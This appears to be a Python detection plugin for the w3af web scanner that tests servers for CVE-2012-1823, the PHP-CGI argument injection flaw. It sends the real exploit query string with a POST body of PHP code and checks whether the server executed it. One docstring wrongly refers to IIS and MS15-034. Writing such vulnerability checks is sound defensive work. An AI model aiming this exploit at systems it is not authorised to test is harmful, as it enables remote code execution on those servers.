from w3af.core.controllers.plugins.infrastructure_plugin import InfrastructurePlugin
from w3af.core.controllers.misc.decorators import runonce
from w3af.core.controllers.exceptions import RunOnce
from w3af.core.data.request.fuzzable_http_request import FuzzableHTTPRequest

import re, random


class cve_2012_1823(InfrastructurePlugin):
    """
    Detect CVE-2012-1823 (PHP < 5.3.12 / < 5.4.2 - CGI Argument Injection)
    """
    NAME = "CVE 2012-1823"

    @runonce(exc_class=RunOnce)
    def discover(self, fuzzable_http_request):
        """
        Checks if the remote IIS is vulnerable to MS15-034
        """
        url = fuzzable_http_request.get_url()
        url = url.url_join("/?-dallow_url_include%%3don+-dauto_prepend_file%%3dphp://input")
        
        n1 = random.randint(10**3, 10**4)
        n2 = random.randint(10**3, 10**4)
        payload = "<?php echo(%d*%d); ?>"%(n1, n2)
        verify_pattern = str(n1*n2)

        response = self.requestor.http.POST(url, data=payload, cache=False, grep=False)
        match =  re.search(verify_pattern, response.get_body())
        vuln_data = {
            "payload": payload,
            "verify_pattern": verify_pattern,
        }

        if match:
            fr = FuzzableHTTPRequest.from_http_response(response)
            vuln = self.create_vuln("CVE-2012-1823 (PHP < 5.3.12 / < 5.4.2 - CGI Argument Injection)", traffic_ids=response.id, mutant=fr, data=vuln_data)
            self.save_vuln(vuln, vuln_type="php_cgi")
